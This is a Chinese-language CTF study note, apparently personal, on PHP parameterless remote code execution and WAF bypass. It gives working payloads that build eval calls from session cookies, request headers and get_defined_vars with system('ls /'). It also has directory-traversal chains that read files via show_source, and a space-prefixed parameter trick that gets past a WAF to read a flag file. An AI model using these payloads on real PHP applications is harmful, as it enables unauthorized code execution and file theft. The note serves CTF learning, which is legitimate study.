
# 无参数RCE



## 无参数RCE题目特征：
```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {    
    eval($_GET['star']);
}
```
正则表达式 [^\W]+\((?R)?\) 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 是递归引用，它只能匹配和替换嵌套的函数调用，而不能处理函数参数。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号 ;，而最终结果强等于；时，payload才能进行下一步。简而言之，无参数rce就是不使用参数，而只使用一个个函数最终达到目的。

## 相关函数简要介绍：
print_r(glob("\*")); glob("\*")： 是一种用于获取当前目录下的文件和子目录列表的方法，适用于多个操作系统， 包括 Linux 和 Windows。
scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）
localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）
current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西
getcwd() :取得当前工作目录
dirname():函数返回路径中的目录部分
array_flip() :交换数组中的键和值，成功时返回交换后的数组
array_rand() :从数组中随机取出一个或多个单元

array_reverse():将数组内容反转

strrev():用于反转给定字符串

getcwd()：获取当前工作目录路径

dirname() ：函数返回路径中的目录部分。
chdir() ：函数改变当前的目录。

eval()、assert()：命令执行

highlight_file()、show_source()、readfile()：读取文件内容

## 方法1 scandir（）最常规的通解

举个例子scandir('.')是返回当前目录,虽然我们无法传参，但是由于localeconv() 返回的数组第一个就是‘.’，current()取第一个值，那么current(localeconv())就能构造一个‘.’,那么以下就是一个简单的返回查看当前目录下文件的payload：

```
?参数=var_dump(scandir(current(localeconv())));

//我们要构造scandir（.）（返回当前目录）
而localeconv数组的第一项是.
所以我们用current取第一位.
构造出scandir（.）
```
数组移动操作：
```php
end() ： 将内部指针指向数组中的最后一个元素，并输出
next() ：将内部指针指向数组中的下一个元素，并输出
prev() ：将内部指针指向数组中的上一个元素，并输出
reset() ： 将内部指针指向数组中的第一个元素，并输出
each() ： 返回当前元素的键名和键值，并将内部指针向前移动
现在用foreach


//$fruits = ["apple", "banana", "cherry"];

//foreach ($fruits as $fruit) {
//    echo $fruit . "\n";
//}
```

## 方法2 session_id（）
使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）

 首先我们需要开启session_start()来保证session_id()的使用，session_id可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现

### 1 hex2bin（）
首先我们把要执行的命令进行十六进制编码
```php
<?php
$encoded = bin2hex("phpinfo();");
echo $encoded;
?>
```
得到phpinfo（）十六进制为706870696e666f28293b

那么我的payload可以为
```
?参数=eval(hex2bin(session_id(session_start())));
```

同时更改cookie后的值为想执行的命令的十六进制编码

也就是说，我们在发送请求之前手动设置我们的cookie为706870696e666f28293b

那么在session_start()之后，会话cookie被成功设置为706870696e666f28293b

session_id成功调用我们的cookie为706870696e666f28293b
并进行hex2bin解码

最后执行eval（phpinfo（））


### 2 读文件

同理当我们知道文件名字为flag.php后
把flag.php放在cookie的PHPSESSID后面，构造payload为

```
readfile(session_id(session_start()));
```

直接读取flag.php

### 3 getallheaders（）

getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）

当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：

```
var_dump(end(getallheaders()));
```
这样我们在请求头最后随便写一个
sky: phpinfo()
就可以执行

### get_defined_vars()
相较于getallheaders（）更加具有普遍性，它可以回显全局变量$_GET、$_POST、$_FILES、$_COOKIE，

返回数组顺序为$_GET-->$_POST-->$_COOKIE-->$_FILES

首先确认是否有回显：
```
print_r(get_defined_vars());
```

假如说原本只有一个参数a，那么可以多加一个参数b，后面写入恶意语句，payload：
```
a=eval(end(current(get_defined_vars())));&b=system('ls /');
```
（current（）用于移动数组指针）
注：get_defined_vars()会输出全局变量，在返回的数组中，PHP **会先把超全局变量**（`_GET`, `_POST` 等）加入，再把用户定义的变量加入数组。  并且输出的顺序是按照变量加入的顺序决定的，我先定义了变量r  再定义变量x  那么返回的数组就为
```
[_GET] => Array()
[_POST] => Array()
...
[r] => 1
[x] => hello

```

所以，以上payload是拿到全局变量将指针移到最后一个添加的变量b。再eval它

### 5 chdir()&array_rand()**赌狗读文件**



实在无法rce，可以考虑目录遍历进行文件读取

利用`getcwd()`获取当前目录：
```
var_dump(getcwd());
```

结合dirname()列出当前工作目录的父目录中的所有文件和目录:
```
var_dump(scandir(dirname(getcwd())));
```
读上一级文件名：

```
?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));

?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));

?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));

```
读根目录:

ord() 函数和 chr() 函数：只能对第一个字符进行转码，ord() 编码，chr)解码，有概率会解码出斜杠读取根目录
```
?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
```

要用chdir()固定，payload：
```
 ?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array() )))))))))));
```

通过bp的intruder模块来读到根目录：![[Pasted image 20251003143603.jpg]]

![[Pasted image 20251003143606.jpg]]






# PHP特性绕过WAF进行rce


这道题限制输入字母（应该是waf进行的防护）
![[Pasted image 20251013131156.png]]
php中还限制很多特殊符号，也就是说，正常来讲什么都干不了只能进行数字和运算符的输入

这里就要学习到一个php特性

## php解析顺序
```css
[浏览器/攻击者] 
       ↓
[WAF 层]（Lua/Nginx规则、云防护、正则匹配等）
       ↓
[Web 服务器]（Nginx/Apache）
       ↓
[PHP 解释器]（运行源码）
       ↓
[应用逻辑 / 数据库等]

```
这是一个网站的运行逻辑，也就是说，我们的字母过滤是会在waf层也就是在php解释之前

而php有一个特性，==在`num`前面加个空格 `num`，WAF会认为是`空格num`而不是`num`，而且在绕过WAf后进行php解析会将空格去掉==
所以我们传参为
`%20num`
而不是
`num`
这样在解析之前就可以绕过waf

phpinfo（）发现system被ban了

使用var_dump(scandir（chr(47)）)
因为`/`被过滤  而ascii 47是/
正好绕过最后
calc.php/? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))

拿到flag


# php特性
php内的" \ "在做代码执行的时候，会识别特殊字符串，绕过黑名单

例如ban掉 system 函数
但是我输入\system就可能绕过



# 函数扫盲

## find

```
find [起始目录] [搜索条件] [操作]

```
### 常用示例

1. **查找当前目录下所有 `.txt` 文件**
    

`find . -name "*.txt"`

2. **查找 `/var/log` 下大小超过 1MB 的文件**
    

`find /var/log -type f -size +1M`

3. **查找并删除指定文件**
    

`find /tmp -name "*.log" -type f -exec rm -f {} \;`

4. **按时间查找**
    

`# 过去 7 天修改过的文件 find /home/user -type f -mtime -7`

### 常用选项

|选项|含义|
|---|---|
|`-name "pattern"`|按名字匹配|
|`-type f/d`|匹配文件(f)或目录(d)|
|`-size +N/-N`|文件大小大于/小于 N|
|`-mtime N`|修改时间 N 天前|
|`-exec command {} \;`|对匹配的每个文件执行命令|